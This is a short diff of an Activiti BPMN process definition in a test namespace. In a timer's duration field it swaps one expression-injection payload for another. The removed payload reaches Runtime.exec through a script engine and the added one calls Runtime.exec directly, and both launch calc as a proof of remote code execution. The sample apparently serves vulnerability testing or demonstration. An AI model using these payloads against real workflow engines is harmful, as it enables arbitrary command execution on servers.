@@ -12,11 +12,12 @@
              targetNamespace="http://www.activiti.org/test">
 
     <process id="meeting" name="meeting" isExecutable="true">
+
+
         <startEvent id="startEvent1" name="Start" activiti:initiator="host">
             <timerEventDefinition>
                 <timeDuration>
-                   ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance()
-                    .getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
+                    a=java.lang.Runtime.getRuntime().exec('calc');
                 </timeDuration>
             </timerEventDefinition>
         </startEvent>
